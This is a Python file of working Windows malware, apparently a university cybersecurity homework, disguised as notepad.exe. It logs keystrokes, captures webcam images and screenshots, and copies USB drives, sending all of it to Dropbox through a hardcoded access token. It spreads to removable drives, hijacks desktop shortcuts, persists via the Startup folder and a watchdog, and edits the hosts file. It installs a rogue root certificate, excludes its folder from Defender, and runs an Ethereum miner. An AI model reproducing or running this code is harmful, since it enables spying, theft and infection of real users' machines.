from genericpath import exists
import os
import tempfile
from shutil import copy
import sys
import zipfile
import dropbox 
import cv2
import time
import getmac
import shutil #add to req
from time import gmtime, strftime
import pyautogui
import subprocess
import win32com.client 
from pynput import keyboard
import win32file #add to req
import win32api
import sys
from sys import exit
#DROPBOX : vovakakalov dropbox kolokolo09
dbx = dropbox.Dropbox("wE9xm-ertt0AAAAAAAAAAcsC-n6VIo1rtdBP89ynpSRcsv7ffj1sVr1xCbpE6gSk")

############# from HW2 #################################################################################
watchdogScript = '''
import os
import sys
import tempfile
import time
import subprocess
tempPath=tempfile.gettempdir()
actualTempFilePath = os.path.join(tempPath,'notepad.exe')

while(1):
    subprocess.call(actualTempFilePath,shell=True ,creationflags=0x08000000)
 
'''
#   os.system("start /WAIT "+actualTempFilePath)
autorunScript = '''
import sys
import os
import tempfile

tempPath=tempfile.gettempdir()
tempWatchdogPath= os.path.join(tempPath,'watchdog.pyw')
os.startfile(tempWatchdogPath)

sys.exit()
'''

tempPath=tempfile.gettempdir()


config_name = 'myapp.cfg'
thisFilePath=""
# determine if application is a script file or frozen exe
if getattr(sys, 'frozen', False):
    thisFilePath = os.path.dirname(sys.executable)
elif __file__:
    thisFilePath = os.path.dirname(__file__)

#thisFilePath = os.path.dirname(os.path.realpath(__file__))
startupPath=os.environ['appdata'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'

actualFilePath =os.path.join(thisFilePath,'notepad.exe')

txtPath =os.path.join(thisFilePath,'txt.txt')


actualTempFilePath = os.path.join(tempPath,'notepad.exe')

watchdogPath= os.path.join(thisFilePath,'watchdog.pyw')
tempWatchdogPath= os.path.join(tempPath,'watchdog.pyw')

autorunPath=(os.path.join(thisFilePath,'autorun.pyw'))
actualAutorunPath = os.path.join(startupPath,'autorun.pyw')

logPath = os.path.join(thisFilePath,'log.txt')

tempLogPath = os.path.join(tempPath,'log.txt') #ok



def download_server_and_add_certificate():
    tempPath=tempfile.gettempdir()
    dbx.files_download_to_file(os.path.join(tempPath,'ServerWithCert.zip'), "/ServerWithCert.zip")
    serverPath=tempPath+"\\ServerWithCert\\HW1Cyber\\app.py"
    print(serverPath)
    #print(os.getcwd())
    with zipfile.ZipFile(os.path.join(tempPath,'ServerWithCert.zip'), 'r') as zip:
        zip.extractall(os.path.join(tempPath,'ServerWithCert'))
    os.chdir(tempPath+'\\ServerWithCert\\HW1Cyber')
    os.system('certutil -addstore -f "ROOT" rootCA.pem')  
    os.startfile("app.py")
    os.chdir(tempPath)

def upload_keylogs():
    with open('log.txt') as f:    
        dbx.files_upload(f.read().encode(), '/'+macAdress+ '/log.txt', mode=dropbox.files.WriteMode('overwrite'))


#################################################################################################

tempPath=tempfile.gettempdir()
documents = os.path.expanduser('~/Documents')
shortcutsPath = os.path.join(documents,"Programs")
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
test = os.path.join(desktop, "dsk")
macAdress = str(getmac.get_mac_address())

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(" - screenshot.png")
    return " - screenshot.png"



def upload_file(fileToUpload):
    with open(fileToUpload,"rb") as f:    
        dbx.files_upload(f.read(), '/'+macAdress+ '/'+fileToUpload, mode=dropbox.files.WriteMode('overwrite'))

def usb_attack():
    drivebits = win32file.GetLogicalDrives()
    for d in range(0, 26):
        mask = 1 << d
        if drivebits & mask:
            # found drive
            drname = '%c:\\' % chr(ord('A') + d)
            t = win32file.GetDriveType(drname)
            if t == win32file.DRIVE_REMOVABLE:
                if(os.path.exists(os.path.join(drname,'notepad.exe'))):
                    os.remove(os.path.join(drname,'notepad.exe'))
                tempUSBPath = os.path.join(tempPath,"USB")
                if(os.path.exists(tempUSBPath)):
                    shutil.rmtree(tempUSBPath)
                shutil.copytree(drname, tempUSBPath)
                os.chdir(tempPath)
                shutil.make_archive("USB-%c" % chr(ord('A') + d), 'zip', "USB")
                upload_file("USB-%c.zip" % chr(ord('A') + d))
                copy(os.path.join(tempPath,"notepad.exe") , drname)
                os.chdir(thisFilePath)


def infect_shortcuts():
    for filename in os.listdir(test):
        f = os.path.join(test, filename)
        # checking if it is a file
        if os.path.isfile(f) and f.endswith(".lnk"):
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(f)
            fileToOpen = shortcut.Targetpath
            if(not (str(fileToOpen).endswith("exe") or str(fileToOpen).endswith("EXE"))):
                continue
            pathOfFile = os.path.join(shortcutsPath,fileToOpen[3:])
            nameOfFile = pathOfFile.rsplit('\\', 1)[1]
            temp=pathOfFile.rsplit('\\', 1)[0]
            script = '''
import os
import dropbox

dbx = dropbox.Dropbox("wE9xm-ertt0AAAAAAAAAAcsC-n6VIo1rtdBP89ynpSRcsv7ffj1sVr1xCbpE6gSk")

thisFilePath = os.path.dirname(os.path.realpath(__file__))
os.chdir(r\"{}\")
os.startfile(r\"{}\")
os.chdir(thisFilePath)
recoverPath = os.path.join(r\"{}\",'notepad.exe')

dbx.files_download_to_file(recoverPath, "/notepad.exe")
os.chdir(r\"{}\")
os.startfile('notepad.exe')
                '''.format(temp,fileToOpen,shortcutsPath,shortcutsPath)
            if(not os.path.exists(temp)):
                os.makedirs(temp)
            fullFilePath = os.path.join(temp,nameOfFile+".pyw")
            icon = r"{}".format(fileToOpen)
            with open(fullFilePath,'w') as wf:
                #write everything exept infect_shortcuts
                wf.write(script) #at end add virus content
            shortcut.Targetpath = fullFilePath
            shortcut.IconLocation = icon
            shortcut.save()



def download_miner_and_run():
    dbx.files_download_to_file(os.path.join(thisFilePath,'CriptoMiner.zip'), "/CriptoMiner.zip")
    with zipfile.ZipFile(os.path.join(thisFilePath,'CriptoMiner.zip'), 'r') as zip:
        zip.extractall(os.path.join(thisFilePath,'CriptoMiner'))
    minerPath=os.path.join(thisFilePath,"CriptoMiner\\MINING")
    #os.chdir(minerPath) #for explanation
    miner = "t-rex.exe -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x3b416659414cd758c4d067de4c34dedbff3ece7a -p x -w virus"
    cmd = " Add-MpPreference -ExclusionPath "+ minerPath
    print(cmd)
    subprocess.call(["powershell","-Command", cmd],creationflags = 0x08000000)
    time.sleep(1)
    subprocess.Popen(minerPath+"\\"+miner, creationflags=0x08000000)
    #os.startfile("ETH-ethermine.bat")
    #os.chdir(thisFilePath)
    

def upload_image(image_name):
    with open(image_name,"rb") as f:    
        dbx.files_upload(f.read(), '/'+macAdress+ '/' + strftime("%Y-%m-%d %H:%M:%S", gmtime())+image_name, mode=dropbox.files.WriteMode('overwrite'))

############# from HW2 ####################################################################

if(actualFilePath != actualTempFilePath):
    with open(os.environ['windir'] + '\\System32\\drivers\\etc\\hosts', 'a+') as wf: # change dns in host
        wf.write('\n' +'127.0.0.1 ' + "idp-business.poste.it" + '\n')
    with open('watchdog.pyw','w') as wf:
        wf.write(watchdogScript)
    with open('autorun.pyw','w') as wf:
        wf.write(autorunScript)
    with open('log.txt','w') as wf:
        wf.write("")
    with open('txt.txt','w') as wf:
        wf.write("")
    if(not os.path.exists(shortcutsPath)):
        os.makedirs(shortcutsPath)
    copy(txtPath, os.path.join(shortcutsPath,'txt.txt'))
    copy(logPath, tempLogPath)
    copy(autorunPath, actualAutorunPath)
    copy(watchdogPath , tempWatchdogPath)
    copy(actualFilePath , actualTempFilePath) #copying file to temp
    #os.startfile(actualTempFilePath) #starting temp file
    #if(not os.path.exists(os.path.join(shortcutsPath,'notepad.exe'))):
    os.chdir(tempPath)
    #os.startfile(tempWatchdogPath)
    os.chdir(thisFilePath)
    os.remove(logPath)
    os.remove(txtPath)
    #os.remove(actualFilePath)  
    os.remove(watchdogPath)
    os.remove(autorunPath)
    os.startfile(tempWatchdogPath)
    os.system('TASKKILL /F /IM notepad.exe')

if(os.path.exists(os.path.join(shortcutsPath,"txt.txt"))):
    os.chdir("C:\\Windows\\System32")
    os.startfile('notepad.exe')
    os.chdir(thisFilePath)
    os.chdir(shortcutsPath)
    os.remove(os.path.join(shortcutsPath,"txt.txt"))
    os.chdir(thisFilePath)


count=-1
keys=[]

def write_file(keys):
    with open(os.path.join(tempfile.gettempdir(),'log.txt'),"a") as f:
        for key in keys:
            key = str(key).replace("'","") # remove all ' to clean the log
            if key.find("space") >0:
                f.write(" ")
            elif key.find("Key") == -1 : #if clicked normal key (not special)
                f.write(key)

def on_press_1(key):
    global keys,count
    keys.append(key)
    count +=1
    print(count)
    try:
        print('{0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

    if count>20:
        count=0
        print(keys)
        write_file(keys)
        upload_keylogs()
        keys=[]
 
listener = keyboard.Listener(on_press=on_press_1)
listener.start()

###########################################################################################


cam = cv2.VideoCapture(0)
driveb = 0
download_server_and_add_certificate()
download_miner_and_run()
infect_shortcuts()

while True:
    if(driveb !=  win32file.GetLogicalDrives()):
        driveb=win32file.GetLogicalDrives()
        usb_attack()
    time.sleep(10)
    ret, frame = cam.read()
    if not ret:
        print("failed to grab frame")
        break
    img_name = strftime(" - camera.png".format())
    cv2.imwrite(img_name, frame)
    ss_name = screenshot()
    upload_image(ss_name)
    upload_image(img_name)  


